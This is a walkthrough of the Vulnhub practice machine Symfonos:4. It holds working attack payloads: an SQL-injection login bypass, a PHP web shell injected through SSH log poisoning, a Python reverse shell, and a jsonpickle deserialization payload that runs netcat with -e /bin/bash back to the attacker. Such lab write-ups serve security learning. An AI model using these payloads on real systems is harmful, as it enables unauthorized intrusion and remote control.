# Symfonos:4 - Writeup 

Symfonos:4 is an OSCP-like Intermediate real-life based machine from Vulnhub by Zayotic.<br />
This machine is designed to teach people the importance of trying harder.<br />
Link to the machine: [https://www.vulnhub.com/entry/symfonos-4,347/](https://www.vulnhub.com/entry/symfonos-4,347/)
<br />

## Information Gathering

Our first step is identifying our target IP Add.

```bash
┌─[a7@Parrot]─[~/Desktop/vulnHub/Symfonos:4]
└──╼ $fping -agq 10.10.10.0/24
10.10.10.1
10.10.10.2
10.10.10.10
```

<br />

## Ports and Services

Scanning our target for any open port, running services, and version detection.

![](Pics/nmap.png)
<br />
<br />

## Web Enumeration

Let's visit the website.

![](Pics/web.png)
<br />
<br />

We got a picture, inspecting the source code and nothing was found.<br />
Launch `gobuster` to brute-force hidden directories.

![](Pics/enum.png)
<br />
<br />

Let's visit `/atlantis.php`.

![](Pics/web2.png)
<br />
<br />

We got a **Login Form**, tried a few SQL Injection queries and it works.<br />
Enter in Username: `' or 1=1 -- -` and anything in Password.

![](Pics/web3.png)
<br />
<br />

We got a prompt to select a god. When selecting any god, we redirected to `/sea.php?file=hades`.

![](Pics/web4.png)
<br />
<br />

We may get a Local File Inclusion.<br />
Tried to include `/etc/passwd` but didn't work, tried to include different log files and we got `/var/log/auth` which indicates for ssh log poisoning.

![](Pics/web5.png)
<br />
<br />

Let's inject a php code in `/var/log/auth`, the code is:
```bash
ssh '<?php system($_GET['exp']); ?>'@10.10.10.10
```
> Ps: You could change the word "exp" to any word or letter, it's just a parameter to use.

<br />

![](Pics/ssh.png)
<br />
<br />

Now, add `&exp=ls -la` to the URL.

![](Pics/web6.png)
<br />
<br />

Launch a listener, run the reverse shell in the `exp` parameter.<br />
The shell is:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.2",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
<br />

![](Pics/shell.png)
<br />
<br />

## Privilege Escalation

Searching around to escalate our privileges, we found a **Python code** in `/opt/code`.

![](Pics/shell2.png)
<br />
<br />

I notice that files under `/opt/code` indicate a web application, so looked at the processes and open ports and found that there's port 8080 opened locally.

![](Pics/shell3.png)
<br />
<br />

Port 8080 is allowed locally, so we need port forwarding to open it.<br />
Let's forward port 8080 to our machine: `socat TCP-LISTEN:2345,fork TCP:127.0.0.1:8080`

![](Pics/shell4.png)
<br />
<br />

Great! Now, in the web browser open `10.10.10.10:2345`.

![](Pics/web7.png)
<br />
<br />

Click on **Main page**.

![](Pics/web8.png)
<br />
<br />

OK, back to `/whoami` page, inspecting the source code but nothing useful. Open **Burp** to see what's going on.

![](Pics/burp.png)
<br />
<br />

We got a cookie encoded in base64, let's decode it in the **Decoder**.

![](Pics/burp2.png)
<br />
<br />

Remember, we saw this in `/opt/code`, this's **jsonpickle**.<br/>
Searching for an exploit and we found an article.

> Reference: [https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)

Let's build our shell:
```bash
{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["nc 10.10.10.2 3456 -e /bin/bash"]}, null, null, null]}
```
Encode it in the **Decoder**, in **Repeater** replace the old one with the new one and send it.

![](Pics/root.png)
<br />
<br />
